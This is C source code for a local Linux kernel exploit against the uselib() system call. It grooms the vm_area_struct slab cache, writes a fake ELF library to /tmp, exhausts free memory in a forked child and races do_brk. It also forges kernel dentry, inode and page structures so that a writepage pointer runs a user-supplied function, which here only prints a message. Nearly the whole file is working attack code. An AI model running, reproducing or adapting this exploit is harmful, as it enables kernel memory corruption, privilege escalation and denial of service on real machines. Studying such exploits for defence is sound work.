#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sched.h>
#include <limits.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/sysinfo.h>

#include <linux/elf.h>

#include <asm/page.h>

#include <asm/atomic.h>

//	temp lib location
#define LIBNAME 	"/tmp/_elf_lib"

//	time delta to detect race
#define RACEDELTA	5000

#define	SLAB_THRSH	128
#define	SLAB_PER_CHLD	(INT_MAX - 1)
#define LIB_SIZE	( PAGE_SIZE * 4 )
#define STACK_SIZE	( PAGE_SIZE * 4 )

#define TMPLEN		256
#define PGD_SIZE	( PAGE_SIZE*1024 )

#define PAGE_UP(x) ((x+PAGE_SIZE-1) & ~(PAGE_SIZE-1))
#define PG_dirty 4
#define INIT_LIST_HEAD(ptr) do { \
	(ptr)->next = (ptr); (ptr)->prev = (ptr); \
} while (0)

#define BASE (char *) 0x60000000
#define EATFILE "TTeatfile"
#define MEMSZ (70*1024*1024)

static char cstack[STACK_SIZE];
static char name[TMPLEN];
static char line[TMPLEN];

static pid_t consume_pid;

static volatile int
	val = 0,
	go = 0,
	finish = 0,
	delta = 0,
	ccnt=0,
	delta_max = RACEDELTA,
	map_flags = PROT_WRITE|PROT_READ;

static int
	cpid,
	old_esp,
	fd3,
	map_base=0;

static struct timeval tm1, tm2;

static char *libname=LIBNAME;

static char *lib_addr = NULL;

static char *base = BASE;

static char *map_addr;

struct list_head {
  	struct list_head      *next;
  	struct list_head      *prev;
};

struct spinlock_t {
};

struct wq_lock_t {
};

struct wait_queue_head_t {
	struct wq_lock_t lock;
	struct list_head task_list;
};

struct page {
	struct list_head list;		
	struct address_space *mapping;	
	unsigned long index;		
	struct page *next_hash;		
	atomic_t count;			
	unsigned long flags;		
};

struct address_space_operations {
	int (*writepage)(struct page *);
};

struct address_space {
	struct list_head	clean_pages;	
	struct list_head	dirty_pages;	
	struct list_head	locked_pages;	
	unsigned long		nrpages;	
	struct address_space_operations *a_ops;	
};

struct semaphore {
	atomic_t count;
	int sleepers;
	struct wait_queue_head_t wait;
};

struct rw_semaphore {
	signed int		activity;
	struct spinlock_t	wait_lock;
	struct list_head	wait_list;
};

struct inode {
  	struct list_head      i_hash;
  	struct list_head	i_list;
  	struct list_head	i_dentry;

  	struct list_head	i_dirty_buffers;
  	struct list_head	i_dirty_data_buffers;
	
  	unsigned long		i_ino;
  	atomic_t		i_count;
  	unsigned short	i_dev;
  	unsigned short	i_mode;
  	unsigned short	i_nlink;
  	unsigned int	i_uid;
  	unsigned int	i_gid;
  	unsigned short	i_rdev;
  	long long		i_size;
  	long			i_atime;
  	long			i_mtime;
  	long			i_ctime;
  	unsigned int		i_blkbits;
  	unsigned long		i_blksize;
  	unsigned long		i_blocks;
  	unsigned long		i_version;
  	unsigned short        i_bytes;
  	struct semaphore	i_sem;
  	struct rw_semaphore	i_alloc_sem;
  	struct semaphore	i_zombie;
  	void	*i_op;
  	void	*i_fop;
  	void	*i_sb;
  	struct wait_queue_head_t	i_wait;
  	void	*i_flock;
  	struct address_space	*i_mapping;
};

struct dentry {
  	atomic_t d_count;
  	unsigned int d_flags;
  	struct inode *d_inode;
};

int evil_writepage(struct page *p)
{
  	printf("\nYou've done bad things!!\n");
  	//exit(1);
}

static void __list_add(struct list_head *new,
			      struct list_head *prev,
			      struct list_head *next)
{
	next->prev = new;
	next->next = next;
	new->prev = prev;
	prev->next = new;
}

static void list_add(struct list_head *new, struct list_head *head)
{
	__list_add(new, head, head->next);
}

/* build the fake f_dentry
 * we've to emulate a lot of things!
 */
struct fakes {
	struct dentry fake_dentry;
	struct inode fake_inode;
	unsigned long inode1[128];
  	struct page dirty_page;
  	struct address_space fake_mapping;
  	struct address_space_operations fake_ops;
};

struct fakes *fakes;

void buildfakes()
{
	fakes = mmap(0, PAGE_UP(sizeof(*fakes)), PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  	memset(fakes, 0, PAGE_UP(sizeof(*fakes)));
	
    	/* this will be i_sem */
	int i;
	for(i = 0; i < 32; i++)
		fakes->inode1[i] = 1;
	memcpy(&fakes->fake_inode, &fakes->inode1[0], 32 * sizeof(fakes->inode1[0]));

  	fakes->fake_dentry.d_inode  = &fakes->fake_inode; 
	fakes->fake_inode.i_mapping = &fakes->fake_mapping;
	
  	fakes->fake_mapping.a_ops   = &fakes->fake_ops;
  	fakes->fake_ops.writepage   = &evil_writepage;

    	/* make page dirty */
	fakes->dirty_page.flags |= (1 << PG_dirty);
	INIT_LIST_HEAD(&fakes->fake_mapping.locked_pages);
	INIT_LIST_HEAD(&fakes->fake_mapping.dirty_pages);
  	list_add(&fakes->dirty_page.list, &fakes->fake_mapping.dirty_pages);
}

int consume_memory()
{
	struct sysinfo info;
	char *vmem;
	
	sysinfo(&info);
	vmem = malloc(info.freeram);
	if (vmem == NULL)
	{
		perror("malloc");
		return -1;
	}
	memset(vmem, 0x90, info.freeram);

}

inline int tmdiff(struct timeval *t1, struct timeval *t2)
{
int r;

	r=t2->tv_sec - t1->tv_sec;
	r*=1000000;
	r+=t2->tv_usec - t1->tv_usec;
return r;
}

int checkVMA()
{
	char buf[512];
	FILE *f;
	sprintf(buf, "/proc/%d/maps", getpid());
	f = fopen(buf, "rt");
	unsigned int from, to;
	do {
		if(!fgets(buf, 512, f)){
			return 0;
		}
		sscanf(buf, "%x-%x", &from, &to);
	}while( !(from == (unsigned)(lib_addr+PAGE_SIZE) && to == (unsigned)(lib_addr+2*PAGE_SIZE)) );
	return 1;
}

//	try to race do_brk sleeping on kmalloc, may need modification for SMP
int raceme(void* v)
{
	finish=1;

	for(;;) {
//	check if raced:
recheck:
		if(!go) sched_yield();
		gettimeofday(&tm2, NULL);
		delta = tmdiff(&tm1, &tm2);
		if(delta < (unsigned)delta_max) goto recheck;

//	check if lib VMAs exist as expected under race condition
		val = madvise((void*) lib_addr, PAGE_SIZE, MADV_NORMAL);
		if(val) continue;
		if(checkVMA() == 0) continue;

//	recheck race
		if(!go) continue;
		finish++;
		close(fd3);
		if(msync(lib_addr+PAGE_SIZE, PAGE_SIZE, MS_SYNC)<0)
			perror("msync");
		kill(0, SIGKILL);
		_exit(0);
	}

return 0;
}

//	return number of available SLAB objects in cache
int get_slab_objs(const char *sn)
{
static int c, d, u = 0, a = 0;
FILE *fp=NULL;
char x1[20];

	fp = fopen("/proc/slabinfo", "r");

	fgets(name, sizeof(name) - 1, fp);
	do {
		c = u = a = -1;
		if (!fgets(line, sizeof(line) - 1, fp))
			break;
		c = sscanf(line, "%s %u %u %u %u %u %u", name, &u, &a,
			   &d, &d, &d, &d);
	} while (strcmp(name, sn));
	close(fileno(fp));
	fclose(fp);
	return c == 7 ? a - u : -1;
}

long memmaped_size = 0;

//	leave one object in the SLAB
inline void prepare_slab()
{
int *r;
	map_flags ^= PROT_READ;
		
	r = (void*)mmap(map_addr, PAGE_SIZE, map_flags,
			     MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if(MAP_FAILED == r) {
		printf("--> prepare_slab(), %dMb\n", memmaped_size/1024/1024);
		unlink(libname);
		kill(cpid,SIGKILL);
		for(;;) kill(0, SIGKILL);
	}
	map_addr += PAGE_SIZE;
	memmaped_size += PAGE_SIZE;
	*r = (int)map_addr;
}

//	use elf library and try to sleep on kmalloc
void exploitme()
{
int r, sz;
	map_addr = lib_addr + MEMSZ + 16 * PAGE_SIZE;
	fd3 = open(EATFILE, O_CREAT|O_RDWR|O_TRUNC, 0777);
	ftruncate(fd3, PAGE_SIZE);
//	printf("\n    cat /proc/%d/maps", getpid() ); fflush(stdout);
//	helper clone
	finish=0;

	sz = sizeof(cstack) / sizeof(cstack[0]);
	cpid = clone(&raceme, (void*) &cstack[sz-16], CLONE_VM|CLONE_SIGHAND|CLONE_FS|SIGCHLD|CLONE_FILES, NULL );
//	synchronize threads
	while(!finish) sched_yield();
	finish=0;
	
//	try to hit the kmalloc race
	for(;;) {
		mmap(lib_addr+PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED, fd3, 0);
		
		r = get_slab_objs("vm_area_struct");
		//printf("\nfree slab = %d\n",r);
		while(r != 1 && r > 0) {
			prepare_slab();
			r--;
		}

		gettimeofday(&tm1, NULL);
		go = 1;
		r=uselib(libname);
		go = 0;
		if(finish) break;

//	wipe lib VMAs and try again
		r = munmap(lib_addr, LIB_SIZE);
	}

//	seems we raced, free mem
	sleep(5);
	r = munmap(map_addr-memmaped_size, memmaped_size);

	r = munmap(lib_addr, LIB_SIZE);
}


//	make fake ELF library
void make_lib()
{
struct elfhdr eh;
struct elf_phdr eph;
static char tmpbuf[PAGE_SIZE];
int fd;

//	make our elf library
	umask(022);
	unlink(libname);
	fd=open(libname, O_RDWR|O_CREAT|O_TRUNC, 0755);

	memset(&eh, 0, sizeof(eh) );

//	elf exec header
	memcpy(eh.e_ident, ELFMAG, SELFMAG);
	eh.e_type = ET_EXEC;
	eh.e_machine = EM_386;
	eh.e_phentsize = sizeof(struct elf_phdr);
	eh.e_phnum = 1;
	eh.e_phoff = sizeof(eh);
	write(fd, &eh, sizeof(eh) );

//	section header:
	memset(&eph, 0, sizeof(eph) );
	eph.p_type = PT_LOAD;
	eph.p_offset = 4096;
	eph.p_filesz = 4096;
	eph.p_vaddr = lib_addr;
	eph.p_memsz = LIB_SIZE;
	eph.p_flags = PF_W|PF_R|PF_X;
	write(fd, &eph, sizeof(eph) );

//	execable code
	lseek(fd, 4096, SEEK_SET);
	memset(tmpbuf, 0x90, sizeof(tmpbuf) );
	write(fd, &tmpbuf, sizeof(tmpbuf) );
	close(fd);
}

void chldcnt(int v)
{
	ccnt++;
}

//	alloc slab objects...
inline void do_wipe()
{
int *r, c=0, left=0;

	__asm__("movl	%%esp, %0" : : "m"(old_esp) );

	old_esp = (old_esp - PGD_SIZE+1) & ~(PGD_SIZE-1);
	old_esp = map_base? map_base : old_esp;

	for(;;) {
		if(left<=0)
			left = get_slab_objs("vm_area_struct");
		if(left <= SLAB_THRSH)
			break;
		left--;

		map_flags ^= PROT_READ;
		old_esp -= PAGE_SIZE;
		r = (void*)mmap(old_esp, PAGE_SIZE, map_flags,
			MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0 );
		if(MAP_FAILED == r)
			break;

		if(c>SLAB_PER_CHLD)
			break;
		if( (c%1024)==0 ) {
			if(!c) printf("\n");
			printf("\r    child %d VMAs %d", val, c);
			fflush(stdout);
		}
		c++;
	}
	printf("\r    child %d VMAs %d", val, c);
	fflush(stdout);
	kill(getppid(), SIGUSR1);
	for(;;) pause();
}

//	empty SLAB caches
void wipe_slab()
{
	signal(SIGUSR1, chldcnt);
	printf("\n[+] SLAB cleanup"); fflush(stdout);
	for(;;) {
		ccnt=0;
		val++;
		cpid = fork();
		if(!cpid)
			do_wipe();

		while(!ccnt) sched_yield();
		if( get_slab_objs("vm_area_struct") <= SLAB_THRSH )
			break;
	}
	signal(SIGUSR1, SIG_DFL);
}

int main(int ac, char **av)
{
	lib_addr = base;

	buildfakes();

	consume_pid = fork();
	
	if (consume_pid == 0)
	{
		consume_memory();
		pause();
		return 0;
	}

	wipe_slab();
	make_lib();
	exploitme();

return 0;
}
